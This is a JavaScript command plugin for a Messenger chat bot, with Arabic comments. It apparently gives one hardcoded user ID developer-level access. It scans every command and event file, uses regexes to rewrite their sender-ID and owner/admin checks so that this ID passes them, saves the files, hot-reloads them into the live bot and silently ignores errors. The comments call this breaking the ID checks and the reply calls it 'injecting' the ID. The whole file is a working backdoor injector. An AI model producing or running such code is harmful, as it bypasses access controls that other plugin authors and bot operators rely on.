const fs = require("fs-extra");
const path = require("path");

module.exports.config = {
  name: "مطور_مود",
  version: "1.0.0",
  hasPermssion: 2,
  credits: "Ryuzaki Dev",
  description: "فحص وتعديل ملفات البوت لمنح صلاحيات المطور الكاملة للآيدي الخاص بك",
  commandCategory: "مطور",
  usages: "مطور_مود",
  usePrefix: false,
  cooldowns: 5
};

module.exports.run = async function({ api, event }) {
  const { threadID, messageID, senderID } = event;
  const targetDevID = "61563738496733";

  // حماية صارمة للأمر
  if (String(senderID) !== targetDevID) {
    return api.sendMessage(
`╭────────────────╮
  ⎔  رفض الوصول 🚫
╰────────────────╯

 ╰─▫ هذا الأمر للمطور الأساسي فقط

  ⎔────────────────⎔
   ⌬ ʀʏᴜᴢᴀᴋɪ ᴅᴇᴠᴇʟᴏᴘᴍᴇɴت ⌬
  ⎔────────────────⎔`, threadID, messageID);
  }

  // تحديد مسارات الأوامر والأحداث
  const commandsPath = path.join(__dirname);
  const eventsPath = path.join(__dirname, "..", "events");

  let scannedCommands = 0;
  let scannedEvents = 0;
  let modifiedFiles = [];

  // دالة الفحص والتعديل الذكي
  function scanAndPatchDirectory(dirPath, isEvent = false) {
    if (!fs.existsSync(dirPath)) return;
    const files = fs.readdirSync(dirPath).filter(f => f.endsWith(".js"));

    for (const file of files) {
      if (isEvent) scannedEvents++; else scannedCommands++;
      
      const filePath = path.join(dirPath, file);
      let content = fs.readFileSync(filePath, "utf8");
      let isModified = false;

      // 1. البحث عن شروط التحقق من الآيدي التقليدية واختراقها برمجياً
      // يبحث عن أنماط مثل senderID != "123" أو !== "123" أو == "123" ويضيف الأيدي الخاص بك كشرط موازٍ
      const idRegex = /(senderID|sender_id)\s*(!==|===|==|!=)\s*['"`](\d+)['"`]/g;
      
      if (idRegex.test(content) && !content.includes(targetDevID)) {
        // إعادة تعيين المؤشر للبحث والاستبدال
        content = content.replace(idRegex, (match, p1, p2, p3) => {
          if (p3 === targetDevID) return match; // مضاف بالفعل
          
          if (p2 === "!==" || p2 === "!=") {
            // إذا كان الشرط يمنع الآخرين، نجعله يستثني المطور الخاص بنا أيضاً
            return `(${p1} ${p2} "${p3}" && ${p1} ${p2} "${targetDevID}")`;
          } else {
            // إذا كان الشرط يسمح لشخص محدد فقط، نجعله يسمح للمطور الخاص بنا أيضاً
            return `(${p1} ${p2} "${p3}" || ${p1} ${p2} "${targetDevID}")`;
          }
        });
        isModified = true;
      }

      // 2. البحث عن متغيرات المطورين الثابتة وتوسيعها (مثل devID = "xxx")
      const devIdRegex = /(const|let|var)\s+(devID|adminID|ownerID)\s*=\s*['"`](\d+)['"`]/g;
      if (devIdRegex.test(content) && !content.includes(targetDevID)) {
        content = content.replace(devIdRegex, (match, p1, p2, p3) => {
          return `${p1} ${p2} = String(senderID) === "${targetDevID}" ? "${targetDevID}" : "${p3}"`;
        });
        isModified = true;
      }

      // حفظ التعديلات إذا تمت
      if (isModified) {
        fs.writeFileSync(filePath, content, "utf8");
        modifiedFiles.push(`${isEvent ? "حدث" : "أمر"}: ${file}`);
        
        // إعادة تحميل الكاش في ذاكرة البوت فوراً لتفعيل المود الجديد بدون ريستارت
        try {
          delete require.cache[require.resolve(filePath)];
          const updatedModule = require(filePath);
          if (!isEvent && updatedModule.config && updatedModule.config.name) {
            global.client.commands.delete(updatedModule.config.name);
            global.client.commands.set(updatedModule.config.name, updatedModule);
          } else if (isEvent && updatedModule.config && updatedModule.config.name) {
            global.client.events.delete(updatedModule.config.name);
            global.client.events.set(updatedModule.config.name, updatedModule);
          }
        } catch (e) {
          // فحص صامت في حال وجود أخطاء تجميلية
        }
      }
    }
  }

  // بدء عملية الفحص الشامل
  try {
    // فحص مجلد الأوامر الحالي
    scanAndPatchDirectory(commandsPath, false);
    // فحص مجلد الأحداث
    scanAndPatchDirectory(eventsPath, true);

    let report = "";
    if (modifiedFiles.length > 0) {
      report += ` ⊞ ◜ المـلفات الـتي تـم تـطويـعـها ⚙️ ◞\n`;
      modifiedFiles.forEach(f => report += ` ├─▫ ${f}\n`);
    } else {
      report += ` ├─▫ لم يتم العثور على ملفات مقفلة بآيديهات غريبة، أو أن كل الملفات مطوعة مسبقاً للآيدي الخاص بك. ✨\n`;
    }

    const msg =
`╭────────────────╮
  ⎔  مـطـور مـود 🛡️
╰────────────────╯

 📊 نـتـيـجـة الـفـحـص الـشـامـل:
 ├─▫ تم فحص الأوامر: ${scannedCommands} ملف
 ├─▫ تم فحص الأحداث: ${scannedEvents} ملف
 ┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄
${report}
 ┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄
 ╰─▫ حالة الصلاحيات: تم حقن الآيدي الخاص بك [${targetDevID}] وتفعيله في الذاكرة الحية للبوت بنجاح! ⚡

  ⎔────────────────⎔
   ⌬ ʀʏᴜᴢᴀᴋɪ ᴅᴇᴠᴇʟᴏᴘᴍᴇɴت ⌬
  ⎔────────────────⎔`;

    return api.sendMessage(msg, threadID, messageID);

  } catch (error) {
    return api.sendMessage(`❌ فشلت عملية الحقن والفحص بسبب خطأ داخلي:\n\n${error.message}`, threadID, messageID);
  }
};
